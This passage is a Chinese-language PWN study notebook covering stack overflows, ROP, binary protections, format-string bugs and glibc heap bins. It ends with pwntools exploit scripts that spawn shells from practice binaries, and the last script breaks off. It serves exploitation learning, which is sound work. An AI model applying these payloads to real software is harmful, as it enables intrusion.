<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png" alt="image-20201028212448211"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png" alt="image-20201028212603675"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png" alt="image-20201028213307651"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png" alt="image-20201028213458423"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png" alt="image-20201028213648493"></p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png" alt="image-20201028213849813"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png" alt="image-20201028215303342"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png" alt="image-20201029211445528"></p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png" alt="image-20201028215837467"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png" alt="image-20201028220533860"></p>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>返回地址为后门地址</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png" alt="image-20201029210250310"></p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>返回地址为写入的shellcode的地址</p>
<p><strong>栈中写入shellcode</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png" alt="image-20201103230658840"></p>
<p><strong>bss段写入shellcode</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png" alt="image-20201103232118467"></p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png" alt="image-20201103231611494"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png" alt="image-20201111165405311"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png" alt="image-20201111170622828"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png" alt="image-20201112200053036"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png" alt="image-20201112201440668"></p>
<h1 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png" alt="image-20201105154134220"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png" alt="image-20201105160249721"></p>
<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png" alt="image-20201105191117470"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png" alt="image-20201105192140397"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png" alt="image-20201105193656915"></p>
<p><strong>调用构造</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png" alt="image-20201105200045153"></p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>存放参数放入寄存器中</p>
<p>但超过6个就会放入栈中</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png" alt="image-20201115233600880"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png" alt="image-20201116194218608"></p>
<h1 id="动态链接过程"><a href="#动态链接过程" class="headerlink" title="动态链接过程"></a>动态链接过程</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png" alt="image-20201106223140061"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png" alt="image-20201106232428225"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png" alt="image-20201106233935531"></p>
<h1 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h1><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Only </p>
<p>它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。</p>
<p><strong>部分RELRO</strong> 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。但是从攻击者角度来看呢，部分RELRO 不堪一击，因为它仅仅使 GOT 存储在 bss 段之前，这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。<br><strong>完全RELRO</strong> 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o a a.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o a a.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o a a.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o a a.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>
<h2 id="The-NX-bits"><a href="#The-NX-bits" class="headerlink" title="The NX bits"></a>The NX bits</h2><p>主要是保护栈区不可执行，通常在checksec中可以查看</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png" alt="image-20201103231211223"></p>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>地址随机化，也很好理解，就是不想让你找到真正的内存地址</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png" alt="image-20201103231430738"></p>
<p>改变值的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p><strong>ASLR 并不负责代码段和数据段的随机化，这由 PIE 负责，但是只有在开启 ASLR 之后，PIE 才会生效。</strong></p>
<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p><strong>这种栈保护措施在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值</strong>，</p>
<p>也称哨兵值，通俗理解，我们可以把它看成一个cookie</p>
<p>它是程序每次运行时随机产生的。</p>
<p>在恢复寄存器状态之前和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个函数的某个操作改变了，如果发现异常程序会中止。<br>最近的 GCC 版本可能会试图自动插入这种溢出检测值。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o a a.c // GCC 可能会试图自动插入这种溢出检测值</span><br><span class="line">gcc -fno-stack-protector -o a a.c //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o a a.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o a a.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>位置无关代码，负责代码段和数据段bss</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o <span class="built_in">test</span> test.c // 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o <span class="built_in">test</span> test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o <span class="built_in">test</span> test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>
<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>控制ESP</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png" alt="image-20201117163123759"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png" alt="image-20201117165305864"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png" alt="image-20201117165321403"></p>
<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p><strong>前提：有printf 且第一个参数可控</strong></p>
<ol>
<li>泄露栈内存</li>
<li>泄露任意地址内存</li>
<li>篡改栈内存</li>
<li>篡改任意地址内存</li>
</ol>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png" alt="image-20201117203103431"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%x</span><br><span class="line">%p 打印栈上内容</span><br><span class="line">%s 打印栈上解析地址的内容</span><br><span class="line">%n 写内容(打印字节的个数)</span><br><span class="line">printf(&quot;%d%d%d&quot;,a,b,c)</span><br><span class="line">printf(&quot;%3$d&quot;,a,b,c) 控制第三个参数</span><br><span class="line"></span><br><span class="line">printf(&quot;%20c&quot;,c)</span><br><span class="line">printf(&quot;aaa%n&quot;,c)</span><br><span class="line">printf(&quot;%7$n&quot;)</span><br><span class="line"></span><br><span class="line">%n 0x00000004</span><br><span class="line">%hn 0x0004</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png" alt="image-20201117213226675"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png" alt="image-20201118152914484"></p>
<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png" alt="image-20201118173315748"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png" alt="image-20201118223608385"></p>
<h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><ul>
<li>逻辑链表：指针连起来,把同类的<code>chunk</code>连起来</li>
<li>物理链表：通过<code>size</code>域组织相邻<code>chunk</code>之间的关系，判断相邻是否为<code>free chunk</code>，若是，则合并</li>
</ul>
<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a><strong>arena</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png" alt="image-20201118224006678"></p>
<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a><strong>chunk</strong></h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png" alt="image-20201118230656646"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png" alt="image-20201119110607276"></p>
<h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a><strong>malloced chunk</strong></h4><p><strong>chunk</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png" alt="image-20201118233221511"></p>
<p><code>pre size</code>:记录上一个free chunk的大小，若上一个chunk在用，则<code>pre size</code>将被合并</p>
<p><code>size</code>:整个chunk 的大小</p>
<p><strong>top chunk</strong></p>
<p>从操作系统批发的不分给用户的chunk</p>
<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a><strong>free chunk</strong></h4><p>small bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png" alt="image-20201119105945419"></p>
<p>large bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png" alt="image-20201119110352335"></p>
<p>fast bin chunk</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png" alt="image-20201119110501531"></p>
<p><strong>pre size 复用</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png" alt="image-20201119114224011"></p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a><strong>bin</strong></h3><p>分配方式：<code>fastbin</code> —&gt;<code>unsorted bin</code>—&gt;<code>small bin</code>/<code>large bin</code> </p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png" alt="image-20201119162311702"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png" alt="image-20201119115539452"></p>
<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a><strong>fastbins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png" alt="image-20201119162151833"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png" alt="image-20201119163702351"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png" alt="image-20201119120748019"></p>
<p><strong>bin的双向链表</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a><strong>unsorted bin</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png" alt="image-20201119163039733"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png" alt="image-20201119163232880"></p>
<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a><strong>small bins</strong></h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png" alt="image-20201119163209378"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png" alt="image-20201119163319068"></p>
<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png" alt="image-20201119163433718"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png" alt="image-20201119163457182"></p>
<p><strong>实例</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png" alt="image-20201119115142092"></p>
<h1 id="堆漏洞"><a href="#堆漏洞" class="headerlink" title="堆漏洞"></a>堆漏洞</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png" alt="image-20201119163935171"></p>
<p><strong>fastbin</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201121183321818.png" alt="image-20201121183321818"></p>
<p><strong>unsorted bin</strong></p>
<h1 id="工具学习"><a href="#工具学习" class="headerlink" title="工具学习"></a>工具学习</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Import pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#Local communication</span></span><br><span class="line">io = process(<span class="string">"./a.out"</span>)</span><br><span class="line"><span class="comment">#Telecommunication</span></span><br><span class="line">io = remote(<span class="string">"ip"</span>,port)</span><br><span class="line"><span class="comment">#Receive message</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvuntil(<span class="string">b":"</span>)</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>,drop = <span class="literal">True</span>)</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#Send message</span></span><br><span class="line">io.sendline(<span class="string">b"abc"</span>)</span><br><span class="line">io.send(p32(<span class="number">0</span>)+<span class="string">b"\x0a"</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str)</span><br><span class="line"><span class="comment">#Interactive</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcraft.sh()  <span class="comment">#in sh environment</span></span><br><span class="line">shellcraft.amd64.sh() <span class="comment">#64 bit</span></span><br><span class="line">asm(shellcraft.sh()) <span class="comment">#machine code</span></span><br><span class="line">asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>) <span class="comment">#if the length is less than 112,then it will be supplemented whith a. </span></span><br><span class="line"><span class="comment">#if you want to attack the 64 bit,pls add it</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#find strings</span></span><br><span class="line">elf = ELF(<span class="string">"./filename"</span>)</span><br><span class="line">hex(next(elf.search(<span class="string">b"/bin/sh"</span>)))</span><br><span class="line"><span class="comment">#elf file</span></span><br><span class="line">elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">hex(elf.got[<span class="string">"puts"</span>])</span><br><span class="line">hex(elf.plt[<span class="string">"system"</span>])</span><br><span class="line">hex(elf.symbols[<span class="string">"buf2"</span>])</span><br><span class="line"><span class="comment">#flat</span></span><br><span class="line">flat([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#generate data</span></span><br><span class="line">cyclic(<span class="number">60</span>)</span><br><span class="line"><span class="comment">#byte data</span></span><br><span class="line">p32(<span class="number">1234</span>)</span><br><span class="line">\xd2\x04\x00\x00</span><br><span class="line">u32(<span class="string">"\xd2\x04\x00\x00"</span>)</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#start</span></span><br><span class="line">gdb file</span><br><span class="line">start</span><br><span class="line"><span class="comment">#run the executable</span></span><br><span class="line">run</span><br><span class="line"><span class="comment">#backtrace</span></span><br><span class="line">backtrace</span><br><span class="line"><span class="comment">#return</span></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line"><span class="comment">#breakpoint</span></span><br><span class="line">b main</span><br><span class="line">b <span class="keyword">function</span></span><br><span class="line">b *0x</span><br><span class="line"><span class="comment">#information for breakpoint</span></span><br><span class="line">info b</span><br><span class="line"><span class="comment">#delete the breakpoint</span></span><br><span class="line">d num</span><br><span class="line"><span class="comment">#run</span></span><br><span class="line">r </span><br><span class="line"><span class="comment">#next step over</span></span><br><span class="line">n </span><br><span class="line"><span class="comment">#step in </span></span><br><span class="line">s  </span><br><span class="line"><span class="comment">#stack</span></span><br><span class="line">stack size</span><br><span class="line">stack 24</span><br><span class="line"><span class="comment">#virtual memory map</span></span><br><span class="line"><span class="comment">#to look rwx segment</span></span><br><span class="line">vmmap</span><br><span class="line"><span class="comment">#plt </span></span><br><span class="line">plt</span><br><span class="line">x p</span><br><span class="line">x/20 p</span><br><span class="line"><span class="comment">#got</span></span><br><span class="line">got</span><br><span class="line"><span class="comment">#chunk</span></span><br><span class="line">fastbin</span><br><span class="line">heap</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">b *<span class="variable">$rebase</span>(0x18540)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">attach pid</span><br><span class="line"><span class="built_in">return</span></span><br></pre></td></tr></table></figure>
<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">G  直接跳转地址</span><br><span class="line">shift+f12  打开字符串窗口</span><br><span class="line">shift+E  提取字符串</span><br><span class="line">n  重命名变量</span><br></pre></td></tr></table></figure>
<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary filename --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
<h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libcbase + one_gadget_address</span><br></pre></td></tr></table></figure>
<h1 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h1><p>非常简单，适合入门</p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="ret2text-1"><a href="#ret2text-1" class="headerlink" title="ret2text"></a>ret2text</h3><p>直接有后门函数，所以我们只需要把垃圾数据填满覆盖ebp，然后让返回地址返回后门函数的地址就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2text"</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048522</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2shellcode-1"><a href="#ret2shellcode-1" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>自己写入shellcode(bss)，然后溢出地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b'a'</span>)</span><br><span class="line">payload = shellcode + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>ROPgadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x80bb196</span></span><br><span class="line">pop_edx = <span class="number">0x806eb90</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload =flat([ <span class="string">b'A'</span>* <span class="number">112</span> , pop_eax , <span class="number">0xb</span> ,pop_edx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x80be408</span> ,int_80])</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png" alt="image-20201107232027030"></p>
<p>栈溢出，有/bin/sh字符串 system@plt 构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh = next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(system_plt) + <span class="string">b'BBBB'</span> + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p>栈溢出 无/bin/sh字符串，但bss段可写</p>
<p>第一种</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png" alt="image-20201112215451308"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">bss = <span class="number">0x804a080</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x70</span> + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span 